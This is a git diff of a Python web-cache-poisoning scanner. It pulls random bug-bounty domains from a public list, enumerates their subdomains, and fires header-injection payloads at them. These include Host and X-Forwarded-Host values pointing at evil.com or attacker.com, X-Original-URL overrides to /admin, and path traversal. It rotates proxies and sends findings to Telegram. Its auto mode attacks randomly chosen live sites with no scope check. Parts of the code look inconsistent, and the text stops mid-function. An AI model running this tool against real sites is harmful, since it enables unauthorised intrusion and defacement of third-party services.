@@ -8,21 +8,122 @@ import random
 import subprocess
 import urllib3
 import re
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, urljoin
 import logging
-from typing import List, Dict, Optional, Set, Tuple
+from typing import List, Dict, Optional, Set, Tuple, NamedTuple
 from requests.exceptions import RequestException
 import os
 from datetime import datetime
+from dataclasses import dataclass
+import hashlib
+import difflib
+import uuid
+import statistics
+from urllib.parse import parse_qs
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+@dataclass
+class CacheValidation:
+    is_cached: bool
+    cache_headers: Dict[str, str]
+    cache_type: Optional[str]
+    ttl: Optional[int]
+    vary_headers: List[str]
+
+@dataclass 
+class PoisonEvidence:
+    reflected_headers: Dict[str, str]
+    poisoned_headers: Dict[str, str]
+    content_changes: Dict[str, float]  
+    cache_status: CacheValidation
+    verification_requests: List[Dict]
+
+@dataclass
+class PoisonResult:
+    is_vulnerable: bool
+    confidence: float
+    evidence: PoisonEvidence
+    payload: Dict
+    response: requests.Response
+
+@dataclass
+class CacheFingerprint:
+    name: str
+    headers: List[str]
+    patterns: List[str]
+    vary_behavior: Dict[str, str]
+    ttl_patterns: List[str]
+    poisoning_vectors: List[str]
+
+@dataclass
+class ValidationResult:
+    success: bool
+    confidence: float
+    evidence: Dict
+    error: Optional[str] = None
+
+@dataclass
+class CacheKeyAnalysis:
+    components: List[str]
+    sensitivity: Dict[str, float]
+    variations: List[str]
+    normalized_key: str
+
+@dataclass
+class AdvancedPoisonCheck:
+    is_poisoned: bool
+    confidence: float
+    technique: str
+    evidence: Dict
+    verification_count: int
+    false_positive_score: float
+
+@dataclass
+class TimingAnalysis:
+    baseline_timing: float
+    response_timings: List[float]
+    timing_pattern: str
+    anomaly_score: float
+
+@dataclass
+class HeaderAnalysis:
+    reflected_count: int
+    reflection_patterns: Dict[str, List[str]]
+    injection_points: List[str]
+    risk_score: float
+
+@dataclass
+class ResponseChain:
+    original: requests.Response
+    poisoned: requests.Response
+    verifications: List[requests.Response]
+    timing_deltas: List[float]
+    cache_hits: int
+    chain_broken: bool
+
+class CachePoisonUI:
+    
+    @staticmethod
+    def log(message: str):
+        print(f"[*] {message}")
+
+    @staticmethod
+    def error(message: str):
+        print(f"[!] {message}")
+
+    @staticmethod
+    def success(message: str):
+        print(f"[+] {message}")
+
 class CachePoisonDetector:
-    def __init__(self, target_url: str = None, threads: int = 10, timeout: int = 10, proxy_list_url: str = None):
+    def __init__(self, target_url: str = None, threads: int = 10, timeout: int = 10, proxy_list_url: str = None, auto_mode: bool = False):
+        self.ui = CachePoisonUI()
         self.target_url = target_url
         self.threads = threads
         self.timeout = timeout
+        self.auto_mode = auto_mode
         self.results = []
         self.proxy_list = []
         self.request_delay = 1.5
@@ -30,14 +131,12 @@ class CachePoisonDetector:
         self.last_request_time = 0
         self.cache_indicators = set()
         
-        # Setup logging
         logging.basicConfig(
             level=logging.INFO,
             format='%(asctime)s - %(levelname)s - %(message)s'
         )
         self.logger = logging.getLogger(__name__)
         
-        # Load proxy list
         if proxy_list_url:
             try:
                 response = requests.get(proxy_list_url)
@@ -45,20 +144,41 @@ class CachePoisonDetector:
             except Exception as e:
                 logging.error(f"Failed to load proxy list: {e}")
 
-        # Initialize payload generators
         self.init_payloads()
         
-        # If no target provided, get random targets from bounty-targets
         if not self.target_url:
             self.targets = self.get_random_targets()
         else:
             self.targets = [self.target_url]
 
-        # Get and filter suitable targets
         self.all_targets = self.get_suitable_targets()
 
+        self.min_verification_requests = 20
+        self.verification_intervals = [2, 5, 10, 20, 30, 45, 60, 90, 120, 180, 240, 300]
+        self.min_confidence_threshold = 0.985
+        self.similarity_threshold = 0.997
+        self.max_dynamic_ratio = 0.015
+        self.required_validation_passes = 11
+        
+        self.chain_break_threshold = 0.1
+        self.min_cache_hit_ratio = 0.95
+        self.max_timing_variance = 0.2
+
+        self.timing_thresholds = {
+            'anomaly': 2.0,
+            'variance': 0.3
+        }
+        
+        self.reflection_patterns = self.init_reflection_patterns()
+        self.injection_signatures = self.init_injection_signatures()
+        self.false_positive_patterns = self.init_fp_patterns()
+
+        self.init_enhanced_fingerprints()
+
+        self.cache_key_variations = self.generate_cache_key_variations()
+        self.poisoning_techniques = self.load_poisoning_techniques()
+
     def init_payloads(self):
-        """Initialize various payload combinations"""
         self.base_domains = [
             'evil.com',
             'attacker.com',
@@ -77,7 +197,6 @@ class CachePoisonDetector:
         ]
         
         self.test_headers = {
-            # Host header variations
             'Host': self.base_domains,
             'X-Forwarded-Host': self.base_domains,
             'X-Host': self.base_domains,
@@ -86,43 +205,35 @@ class CachePoisonDetector:
             'X-Original-Host': self.base_domains,
             'X-Backend-Host': self.base_domains,
             
-            # Scheme/Protocol variations
             'X-Forwarded-Proto': ['http', 'https', 'ws', 'wss'],
             'X-Forwarded-Scheme': ['http', 'https', 'ws', 'wss'],
             'X-URL-Scheme': ['http', 'https'],
             
-            # Path override attempts
             'X-Original-URL': self.path_payloads,
             'X-Rewrite-URL': self.path_payloads,
             'X-Override-URL': self.path_payloads,
             
-            # Cache control attempts
             'X-Cache-Key': self.base_domains,
             'X-Cache-Hash': self.base_domains,
             'X-Cache-Vary': ['accept-encoding,host,x-forwarded-host'],
             
-            # CDN-specific headers
             'CF-Connecting-IP': ['127.0.0.1', '192.168.0.1'],
             'Fastly-SSL': ['1'],
             'Akamai-Origin-Hop': ['1'],
             'CDN-Loop': ['cloudflare'],
             
-            # Other potential vectors
             'X-Frame-Options': ['ALLOW-FROM evil.com'],
             'Content-Security-Policy': ['connect-src evil.com'],
             'Access-Control-Allow-Origin': self.base_domains
         }
 
     def is_cacheable_response(self, response: requests.Response) -> bool:
-        """Enhanced cache detection"""
         cache_indicators = {
-            # Standard cache headers
             'Cache-Control': lambda x: any(d in x.lower() for d in ['public', 'max-age', 's-maxage']),
             'X-Cache': lambda x: True,
             'X-Cache-Hit': lambda x: True,
             'Age': lambda x: int(x) > 0 if x.isdigit() else False,
             
-            # CDN-specific headers
             'CF-Cache-Status': lambda x: x.upper() != 'BYPASS',
             'X-Varnish': lambda x: True,
             'X-Drupal-Cache': lambda x: True,
@@ -131,7 +242,6 @@ class CachePoisonDetector:
             'X-Cache-Hits': lambda x: int(x) > 0 if x.isdigit() else False,
             'X-CDN': lambda x: True,
             
-            # Azure/AWS/GCP indicators
             'X-Azure-Ref': lambda x: True,
             'X-Served-By': lambda x: True,
             'X-Cache-Key': lambda x: True
@@ -149,25 +259,20 @@ class CachePoisonDetector:
         return False
 
     def analyze_cacheability(self, url: str) -> Tuple[bool, Dict]:
-        """Analyze if a target is suitable for cache poisoning"""
         try:
-            # Make initial request
             resp1 = self.make_request(url)
             if not resp1:
                 return False, {}
 
-            # Check for cache indicators
             is_cacheable = self.is_cacheable_response(resp1)
             if not is_cacheable:
                 return False, {}
 
-            # Make second request to verify caching behavior
             time.sleep(2)
             resp2 = self.make_request(url)
             if not resp2:
                 return False, {}
 
-            # Analyze cache behavior
             cache_info = {
                 'cache_headers': list(self.cache_indicators),
                 'cache_time': int(resp1.headers.get('Age', 0)),
@@ -184,7 +289,6 @@ class CachePoisonDetector:
             return False, {}
 
     def detect_cdn(self, response: requests.Response) -> str:
-        """Detect CDN from response headers"""
         cdn_indicators = {
             'Cloudflare': ['cf-ray', 'cf-cache-status'],
             'Akamai': ['x-akamai-transformed'],
@@ -201,22 +305,18 @@ class CachePoisonDetector:
         return 'Unknown'
 
     def get_suitable_targets(self) -> List[str]:
-        """Get and filter suitable targets for cache poisoning"""
         all_targets = []
         
-        # First, enumerate subdomains
         raw_targets = self.enumerate_subdomains()
         
         self.logger.info(f"Analyzing {len(raw_targets)} potential targets for cacheability...")
         
         for target in raw_targets:
             try:
-                # Try HTTPS first
                 url = f"https://{target}"
                 is_cacheable, cache_info = self.analyze_cacheability(url)
                 
                 if not is_cacheable:
-                    # Try HTTP if HTTPS fails
                     url = f"http://{target}"
                     is_cacheable, cache_info = self.analyze_cacheability(url)
                 
@@ -232,7 +332,6 @@ class CachePoisonDetector:
                 self.logger.error(f"Error analyzing target {target}: {e}")
                 continue
         
-        # Sort targets by potential vulnerability (more cache headers = more interesting)
         sorted_targets = sorted(
             all_targets,
             key=lambda x: len(x['cache_info']['cache_headers']),
@@ -242,12 +341,10 @@ class CachePoisonDetector:
         return [t['url'] for t in sorted_targets]
 
     def get_random_targets(self, num_targets: int = 3) -> List[str]:
-        """Get random targets from bounty-targets-data"""
         try:
             response = requests.get('https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt')
             all_targets = [t.strip().replace('*.', '') for t in response.text.split('\n') if t.strip()]
             
-            # Filter out invalid targets and select random ones
             valid_targets = [t for t in all_targets if not t.startswith('*') and '.' in t]
             return random.sample(valid_targets, min(num_targets, len(valid_targets)))
             
@@ -256,12 +353,10 @@ class CachePoisonDetector:
             return []
 
     def enumerate_subdomains(self) -> List[str]:
-        """Enumerate subdomains using subfinder"""
         all_subdomains = []
         
         for target in self.targets:
             try:
-                # Run subfinder
                 self.logger.info(f"Enumerating subdomains for {target}")
                 result = subprocess.run(
                     ['subfinder', '-d', target, '-silent', '-recursive'],
@@ -269,7 +364,6 @@ class CachePoisonDetector:
                     text=True
                 )
                 
-                # Process subfinder output
                 subdomains = [
                     sub.strip() 
                     for sub in result.stdout.split('\n') 
@@ -285,7 +379,6 @@ class CachePoisonDetector:
         return all_subdomains if all_subdomains else self.targets
 
     def apply_rate_limiting(self):
-        """Implement rate limiting between requests"""
         current_time = time.time()
         time_since_last_request = current_time - self.last_request_time
         
@@ -296,11 +389,9 @@ class CachePoisonDetector:
         self.last_request_time = time.time()
 
     def get_random_proxy(self):
-        """Get a random proxy from the proxy list"""
         return random.choice(self.proxy_list) if self.proxy_list else None
 
     def make_request(self, url: str, headers: Dict = None) -> Optional[requests.Response]:
-        """Make a request with rate limiting and proxy rotation"""
         self.apply_rate_limiting()
         
         try:
@@ -318,21 +409,17 @@ class CachePoisonDetector:
             return None
 
     def check_response_similarity(self, resp1: requests.Response, resp2: requests.Response) -> float:
-        """Check how similar two responses are"""
         if not resp1 or not resp2:
             return 0.0
             
-        # Compare status codes
         if resp1.status_code != resp2.status_code:
             return 0.5
             
-        # Compare response lengths
         len1 = len(resp1.text)
         len2 = len(resp2.text)
-        if abs(len1 - len2) > (max(len1, len2) * 0.1):  # 10% threshold
+        if abs(len1 - len2) > (max(len1, len2) * 0.1):
             return 0.7
             
-        # Compare headers
         common_headers = set(resp1.headers.keys()) & set(resp2.headers.keys())
         header_diff = sum(resp1.headers[h] != resp2.headers[h] for h in common_headers)
         if header_diff > 0:
@@ -341,7 +428,6 @@ class CachePoisonDetector:
         return 1.0
 
     def send_telegram_notification(self, result: Dict):
-        """Send minimal, focused notification"""
         try:
             import telegram
             import asyncio
@@ -350,31 +436,39 @@ class CachePoisonDetector:
                 bot = telegram.Bot(token=os.getenv('TELEGRAM_BOT_TOKEN'))
                 chat_id = os.getenv('TELEGRAM_CHAT_ID')
                 
-                alert = f"""Cache Poisoning Found:
-Target: {result['url']}
-Payload: {json.dumps(result['payload']['headers'], indent=2)}
-Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers), indent=2)}"""
+                alert = f"""🚨 Cache Poisoning Vulnerability Found
 
-                await bot.send_message(chat_id=chat_id, text=alert)
+Target: {result['url']}
+CDN: {result['cache_info'].get('cdn_info', 'Unknown')}
+
+Vulnerable Headers:
+{json.dumps(result['vulnerable_headers'], indent=2)}
+
+Cache Info:
+{json.dumps(result['cache_info'], indent=2)}
+
+Evidence:
+{json.dumps(result['evidence'], indent=2)}
+
+Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+                await bot.send_message(chat_id=chat_id, text=alert, parse_mode='Markdown')
                 
             asyncio.run(send_alert())
+            self.ui.success("Notification sent to Telegram")
         except Exception as e:
-            self.logger.error(f"Notification failed: {e}")
+            self.logger.error(f"Failed to send Telegram notification: {str(e)}")
 
     def test_header_combination(self, headers: Dict[str, str]) -> Optional[Dict]:
-        """Enhanced cache poisoning detection"""
         try:
-            # Make control request
             control_resp = self.make_request(self.target_url)
             if not control_resp or not self.is_cacheable_response(control_resp):
                 return None
 
-            # Test with poisoned headers
             poison_resp = self.make_request(self.target_url, headers)
             if not poison_resp:
                 return None
 
-            # Multiple verification requests to confirm caching
             time.sleep(random.uniform(2.0, 3.0))
             verify_resps = []
             for _ in range(3):
@@ -386,7 +480,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
             if not verify_resps:
                 return None
 
-            # Analyze responses for cache poisoning indicators
             evidence = self.analyze_poison_evidence(
                 control_resp,
                 poison_resp,
@@ -406,7 +499,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
                     }
                 }
                 
-                # Send immediate notification
                 self.send_telegram_notification(result)
                 return result
 
@@ -422,22 +514,18 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         verify_resps: List[requests.Response],
         test_headers: Dict[str, str]
     ) -> Dict:
-        """Precise cache poisoning detection with strict validation"""
         evidence = {
             'is_vulnerable': False,
             'poisoned_response': None,
             'payload': None
         }
 
-        # Strict validation of responses
         if not self.validate_responses(control_resp, poison_resp, verify_resps):
             return evidence
 
-        # Verify cache behavior
         if not self.is_definitely_cached(control_resp, verify_resps):
             return evidence
 
-        # Verify poisoning with multiple precise checks
         poisoning_result = self.verify_precise_poisoning(
             control_resp,
             poison_resp,
@@ -455,16 +543,14 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         return evidence
 
     def is_definitely_cached(self, control_resp: requests.Response, verify_resps: List[requests.Response]) -> bool:
-        """Strict cache validation"""
         cache_headers = {
             'CF-Cache-Status': {'HIT'},
             'X-Cache': {'HIT', 'TCP_HIT'},
-            'X-Varnish': None,  # Presence indicates Varnish
-            'Age': None,  # Any value > 0 indicates caching
-            'X-Cache-Hits': None  # Any value > 0 indicates caching
+            'X-Varnish': None,
+            'Age': None,
+            'X-Cache-Hits': None
         }
 
-        # Check control response
         cache_indicators = 0
         for header, valid_values in cache_headers.items():
             if header in control_resp.headers:
@@ -478,7 +564,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
                 elif control_resp.headers[header] in valid_values:
                     cache_indicators += 1
 
-        # Verify consistent caching behavior
         for resp in verify_resps:
             resp_indicators = 0
             for header, valid_values in cache_headers.items():
@@ -498,23 +583,19 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         verify_resps: List[requests.Response],
         test_headers: Dict[str, str]
     ) -> Dict:
-        """Precise verification of cache poisoning"""
         result = {
             'confirmed': False,
             'response': None,
             'payload': None
         }
 
-        # Extract unique identifiers from poison response
         poison_identifiers = self.extract_poison_indicators(poison_resp, test_headers)
         
-        # Verify poisoning across all verification responses
         confirmed_responses = []
         for resp in verify_resps:
             if self.confirm_poison_indicators(resp, poison_identifiers):
                 confirmed_responses.append(resp)
 
-        # Require at least 2 verification responses to confirm
         if len(confirmed_responses) >= 2:
             result.update({
                 'confirmed': True,
@@ -528,15 +609,12 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         return result
 
     def extract_poison_indicators(self, resp: requests.Response, test_headers: Dict[str, str]) -> Set[str]:
-        """Extract unique indicators of successful poisoning"""
         indicators = set()
         
-        # Check for reflected headers
         for header, value in test_headers.items():
             if value in resp.text:
                 indicators.add(f"reflected:{value}")
         
-        # Check for modified headers
         for header, value in test_headers.items():
             if header in resp.headers and value in resp.headers[header]:
                 indicators.add(f"header_modified:{header}={value}")
@@ -544,7 +622,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         return indicators
 
     def confirm_poison_indicators(self, resp: requests.Response, indicators: Set[str]) -> bool:
-        """Confirm presence of poison indicators in response"""
         for indicator in indicators:
             indicator_type, value = indicator.split(':', 1)
             
@@ -559,16 +636,13 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         return True
 
     def validate_responses(self, control_resp, poison_resp, verify_resps) -> bool:
-        """Comprehensive response validation"""
         if not all([control_resp, poison_resp] + verify_resps):
             return False
         
-        # Validate response codes
-        valid_codes = {200, 301, 302, 307, 308}  # Expected response codes
+        valid_codes = {200, 301, 302, 307, 308}
         if not all(r.status_code in valid_codes for r in [control_resp, poison_resp] + verify_resps):
             return False
         
-        # Check for error pages
         error_indicators = ['error', 'exception', 'not found', 'forbidden']
         if any(any(ind in r.text.lower() for ind in error_indicators) 
                for r in [control_resp, poison_resp] + verify_resps):
@@ -577,75 +651,85 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         return True
 
     def scan(self) -> List[Dict]:
-        """Main scanning function"""
-        self.logger.info(f"Starting cache poison scan for {self.target_url}")
-        
         header_combinations = self.generate_header_combinations()
+        total_combinations = len(header_combinations)
+        results = []
+        
+        self.ui.log(f"Testing {total_combinations} payload combinations...")
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            results = list(filter(None, executor.map(
-                self.test_header_combination,
-                header_combinations
-            )))
+            futures = []
+            for headers in header_combinations:
+                futures.append(executor.submit(self.test_header_combination, headers))
             
-        self.logger.info(f"Scan completed. Found {len(results)} potential vulnerabilities.")
+            for i, future in enumerate(as_completed(futures), 1):
+                self.ui.log(f"Progress: {i}/{total_combinations}")
+                result = future.result()
+                if result:
+                    results.append(result)
+        
         return results
 
     def scan_all(self) -> List[Dict]:
-        """Scan all targets and their subdomains"""
-        all_results = []
+        self.ui.log("Starting cache poison scan...")
         
-        for target in self.all_targets:
+        if not self.target_url and not self.auto_mode:
+            self.ui.error("No target specified. Use -u/--url or --auto")
+            return []
+            
+        if self.auto_mode and not self.target_url:
+            self.targets = self.get_random_targets(3)
+            if not self.targets:
+                self.ui.error("Failed to get random targets")
+                return []
+            self.ui.log(f"Selected targets: {', '.join(self.targets)}")
+        elif self.target_url:
+            self.targets = [self.target_url]
+            
+        all_results = []
+        total_targets = len(self.all_targets)
+        
+        for idx, target in enumerate(self.all_targets, 1):
             try:
-                self.logger.info(f"🎯 Starting scan for target: {target}")
+                self.ui.log(f"Testing target ({idx}/{total_targets}): {target}")
                 self.target_url = target
                 
-                # Try HTTPS first
-                try:
-                    self.logger.info("Testing HTTPS...")
-                    test_response = requests.get(self.target_url, timeout=5, verify=False)
-                except:
-                    # If HTTPS fails, try HTTP
-                    self.logger.info("HTTPS failed, trying HTTP...")
-                    self.target_url = target.replace('https://', 'http://')
-                
-                self.logger.info("Analyzing cache behavior...")
+                self.ui.log("Analyzing cache behavior...")
                 is_cacheable, cache_info = self.analyze_cacheability(self.target_url)
                 
                 if is_cacheable:
-                    self.logger.info(f"✅ Target is cacheable! Found indicators: {', '.join(cache_info['cache_headers'])}")
-                    self.logger.info(f"CDN detected: {cache_info['cdn_info']}")
+                    self.ui.success(f"Target is cacheable via {cache_info['cdn_info']}")
                     
-                    self.logger.info("Testing for cache poisoning vulnerabilities...")
                     results = self.scan()
-                    
                     if results:
-                        self.logger.info(f"🚨 Found {len(results)} potential vulnerabilities!")
+                        self.ui.success(f"Found {len(results)} vulnerabilities!")
                         for result in results:
-                            self.logger.info(f"""
-                            Vulnerability Details:
-                            - URL: {result['url']}
-                            - Vulnerable Headers: {json.dumps(result['vulnerable_headers'], indent=2)}
-                            - Confidence: {result['evidence']['confidence']}
-                            - Indicators: {', '.join(result['evidence']['indicators'])}
-                            """)
+                            self.send_telegram_notification(result)
                         all_results.extend(results)
                     else:
-                        self.logger.info("No vulnerabilities found in this target")
+                        self.ui.log("No vulnerabilities found")
                 else:
-                    self.logger.info("❌ Target is not cacheable, skipping...")
+                    self.ui.log("Target is not cacheable, skipping...")
                     
             except Exception as e:
-                self.logger.error(f"Failed to scan {target}: {e}")
+                self.ui.error(f"Error scanning {target}: {e}")
                 continue
                 
+        self.display_summary(all_results)
         return all_results
 
+    def display_vulnerability(self, result: Dict):
+        print(f"Target: {result['url']}")
+        print(f"\nPayload:")
+
+    def display_summary(self, results: List[Dict]):
+        print(f"\nTotal Targets Scanned: {len(self.all_targets)}")
+        print(f"Vulnerabilities Found: {len(results)}")
+
+
     def generate_header_combinations(self) -> List[Dict[str, str]]:
-        """Generate different combinations of headers to test"""
         combinations = []
         
-        # Generate single header tests
         for header, values in self.test_headers.items():
             if isinstance(values, list):
                 for value in values:
@@ -653,7 +737,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
             else:
                 combinations.append({header: values})
         
-        # Generate common combination pairs
         common_pairs = [
             ('X-Forwarded-Host', 'X-Forwarded-Proto'),
             ('X-Forwarded-Host', 'X-Forwarded-Scheme'),
@@ -680,7 +763,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
                             header2: v2
                         })
         
-        # Generate CDN-specific combinations
         cdn_combinations = {
             'Cloudflare': [
                 {'CF-Connecting-IP': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1'},
@@ -696,12 +778,10 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
             ]
         }
         
-        # Add CDN-specific combinations based on detected CDN
         if hasattr(self, 'current_cdn'):
             if self.current_cdn in cdn_combinations:
                 combinations.extend(cdn_combinations[self.current_cdn])
         
-        # Add some path traversal attempts
         path_traversal = [
             '/admin',
             '/../admin',
@@ -716,7 +796,6 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
                 'X-Rewrite-URL': path
             })
         
-        # Add cache buster variations
         cache_busters = [
             {'Cache-Control': 'no-cache'},
             {'Pragma': 'no-cache'},
@@ -728,55 +807,925 @@ Poisoned Response Headers: {json.dumps(dict(result['poisoned_response'].headers)
         self.logger.debug(f"Generated {len(combinations)} header combinations to test")
         return combinations
 
+    def init_enhanced_fingerprints(self):
+        self.cache_fingerprints = {
+            'Cloudflare': CacheFingerprint(
+                name='Cloudflare',
+                headers=['CF-Cache-Status', 'CF-RAY', 'CF-POPing'],
+                patterns=['cloudflare'],
+                vary_behavior={
+                    'host': 'sensitive',
+                    'accept-encoding': 'ignored',
+                    'user-agent': 'partial'
+                },
+                ttl_patterns=[
+                    r'max-age=(\d+)',
+                    r's-maxage=(\d+)'
+                ],
+                poisoning_vectors=[
+                    'x-forwarded-host',
+                    'x-original-url',
+                    'x-host'
+                ]
+            ),
+            'Varnish': CacheFingerprint(
+                name='Varnish',
+                headers=['X-Varnish', 'Via', 'X-Cache'],
+                patterns=['varnish'],
+                vary_behavior={
+                    'host': 'sensitive',
+                    'accept-encoding': 'sensitive',
+                    'cookie': 'ignored'
+                },
+                ttl_patterns=[
+                    r'max-age=(\d+)',
+                    r'stale-while-revalidate=(\d+)'
+                ],
+                poisoning_vectors=[
+                    'x-forwarded-host',
+                    'x-forwarded-scheme',
+                    'x-forwarded-proto'
+                ]
+            ),
+        }
+
+    def verify_poison(self, control_resp: requests.Response,
+                     poison_resp: requests.Response,
+                     test_headers: Dict[str, str]) -> PoisonResult:
+        verification_results = []
+        
+        for _ in range(self.min_verification_requests):
+            time.sleep(random.uniform(self.cache_verification_delay, self.cache_verification_delay * 1.5))
+            verify_resp = self.make_request()
+            if verify_resp:
+                cache_validation = self.validate_cache_behavior(verify_resp)
+                if not cache_validation.is_cached:
+                    continue
+                    
+                verification_results.append({
+                    'response': verify_resp,
+                    'cache_validation': cache_validation,
+                    'normalized_content': self.normalize_response(verify_resp)
+                })
+
+        if len(verification_results) < self.min_verification_requests:
+            return PoisonResult(
+                is_vulnerable=False,
+                confidence=0.0,
+                evidence=None,
+                payload=test_headers,
+                response=poison_resp
+            )
+
+        control_content = self.normalize_response(control_resp)
+        poison_content = self.normalize_response(poison_resp)
+        
+        evidence = PoisonEvidence(
+            reflected_headers=self.find_reflected_headers(test_headers, verification_results[0]['response']),
+            poisoned_headers={},
+            content_changes={},
+            cache_status=verification_results[0]['cache_validation'],
+            verification_requests=verification_results
+        )
+
+        confidence_factors = {
+            'cache_consistency': self.validate_cache_consistency(verification_results) * 0.3,
+            'response_similarity': self.validate_response_similarity(poison_content, verification_results) * 0.3,
+            'header_reflection': self.validate_header_reflection(test_headers, verification_results) * 0.2,
+            'error_absence': (not any(self.is_error_page(r['response']) for r in verification_results)) * 0.1,
+            'cache_hit_ratio': (sum(1 for r in verification_results if r['cache_validation'].is_cached) / len(verification_results)) * 0.1
+        }
+
+        advanced_check = self.validate_poisoning_attempt(
+            control_resp,
+            poison_resp,
+            [r['response'] for r in verification_results],
+            "standard",
+            test_headers
+        )
+
+        confidence = (sum(confidence_factors.values()) + advanced_check.confidence) / 2
+
+        is_vulnerable = (confidence >= self.min_confidence_threshold and 
+                        advanced_check.is_poisoned)
+
+        if is_vulnerable:
+            evidence.poisoned_headers = {
+                header: value for header, value in test_headers.items()
+                if header in evidence.reflected_headers
+            }
+            evidence.content_changes = {
+                header: self.calculate_similarity(control_content, poison_content)
+                for header in evidence.poisoned_headers
+            }
+
+        return PoisonResult(
+            is_vulnerable=is_vulnerable,
+            confidence=confidence,
+            evidence=evidence,
+            payload=test_headers,
+            response=verification_results[0]['response']
+        )
+
+    def validate_cache_consistency(self, verification_results: List[Dict]) -> float:
+        cache_types = set(r['cache_validation'].cache_type for r in verification_results)
+        cache_headers = set(frozenset(r['cache_validation'].cache_headers.items()) 
+                          for r in verification_results)
+        
+        if len(cache_types) != 1 or len(cache_headers) != 1:
+            return 0.0
+            
+        return 1.0
+
+    def validate_response_similarity(self, poison_content: str, 
+                                  verification_results: List[Dict]) -> float:
+        similarity_scores = [
+            self.calculate_similarity(poison_content, r['normalized_content'])
+            for r in verification_results
+        ]
+        
+        return min(similarity_scores)
+
+    def generate_payloads(self) -> List[Dict]:
+        base_domains = [
+            'evil.com',
+            'attacker.com',
+            f'cache-{int(time.time())}.evil.com'
+        ]
+
+        headers = {
+            'Host': base_domains,
+            'X-Forwarded-Host': base_domains,
+            'X-Host': base_domains,
+            'X-Forwarded-Server': base_domains,
+            'X-HTTP-Host-Override': base_domains,
+            'X-Forwarded-Proto': ['http', 'https'],
+            'X-Forwarded-Scheme': ['http', 'https'],
+            'X-Cache-Key': base_domains,
+            'Fastly-Debug': ['1'],
+            'X-Akamai-Cache-Key': base_domains,
+            'X-Varnish-Host': base_domains,
+            'CF-Connecting-IP': ['127.0.0.1'],
+            'X-Real-IP': ['127.0.0.1'],
+            'X-Original-URL': ['/admin', '/internal'],
+            'X-Rewrite-URL': ['/admin', '/internal'],
+            'CF-Connecting-IP': ['127.0.0.1'],
+            'X-Real-IP': ['127.0.0.1'],
+            'X-Original-URL': ['/admin', '/internal'],
+            'X-Rewrite-URL': ['/admin', '/internal']
+        }
+
+        payloads = []
+        for header, values in headers.items():
+            for value in values:
+                payloads.append({header: value})
+
+        common_pairs = [
+            ('X-Forwarded-Host', 'X-Forwarded-Proto'),
+            ('Host', 'X-Forwarded-Proto'),
+            ('X-Forwarded-Host', 'X-Cache-Key')
+        ]
+
+        for header1, header2 in common_pairs:
+            if header1 in headers and header2 in headers:
+                for v1 in headers[header1]:
+                    for v2 in headers[header2]:
+                        payloads.append({
+                            header1: v1,
+                            header2: v2
+                        })
+
+        return payloads
+
+    def analyze_cache_key_components(self, response: requests.Response) -> CacheKeyAnalysis:
+        components = []
+        sensitivity = {}
+        variations = []
+        
+        headers = response.headers
+        url_parts = urlparse(response.url)
+        
+        if 'Vary' in headers:
+            vary_headers = [h.strip() for h in headers['Vary'].split(',')]
+            components.extend(vary_headers)
+            
+            for header in vary_headers:
+                sensitivity[header] = self.test_header_sensitivity(response.url, header)
+        
+        if url_parts.query:
+            params = parse_qs(url_parts.query)
+            for param in params:
+                components.append(f"param:{param}")
+                sensitivity[f"param:{param}"] = self.test_param_sensitivity(response.url, param)
+        
+        normalized_key = self.generate_normalized_cache_key(components, sensitivity)
+        
+        variations = self.generate_key_variations(components, sensitivity)
+        
+        return CacheKeyAnalysis(
+            components=components,
+            sensitivity=sensitivity,
+            variations=variations,
+            normalized_key=normalized_key
+        )
+
+    def test_header_sensitivity(self, url: str, header: str) -> float:
+        original_resp = self.make_request(url)
+        if not original_resp:
+            return 0.0
+            
+        test_values = [
+            f"test-{int(time.time())}", 
+            "different-value",
+            f"cache-{uuid.uuid4()}"
+        ]
+        
+        different_responses = 0
+        total_tests = len(test_values)
+        
+        for value in test_values:
+            headers = {header: value}
+            test_resp = self.make_request(url, headers)
+            if test_resp and self.is_different_cached_response(original_resp, test_resp):
+                different_responses += 1
+                
+        return different_responses / total_tests
+
+    def validate_poisoning_attempt(self, original_resp: requests.Response,
+                                    poison_resp: requests.Response,
+                                    verification_resps: List[requests.Response],
+                                    technique: str,
+                                    test_headers: Dict[str, str]) -> AdvancedPoisonCheck:
+        validation_scores = {
+            'cache_persistence': 0.0,
+            'content_consistency': 0.0,
+            'header_reflection': 0.0,
+            'error_detection': 0.0,
+            'cdn_specific': 0.0,
+            'cache_key_match': 0.0,
+            'timing_analysis': 0.0,
+            'header_analysis': 0.0
+        }
+        
+        validation_scores.update({
+            'cache_persistence': self.validate_cache_persistence(verification_resps),
+            'content_consistency': self.validate_content_consistency(poison_resp, verification_resps),
+            'header_reflection': self.validate_header_reflection_impact(poison_resp.headers, verification_resps),
+            'error_detection': self.validate_error_absence(verification_resps),
+            'cdn_specific': self.validate_cdn_behavior(verification_resps),
+            'cache_key_match': self.validate_cache_key_match(original_resp, poison_resp, verification_resps),
+            'timing_analysis': self.analyze_response_timing(verification_resps).anomaly_score,
+            'header_analysis': self.analyze_headers(poison_resp, test_headers).risk_score
+        })
+        
+        weights = {
+            'cache_persistence': 0.25,
+            'content_consistency': 0.20,
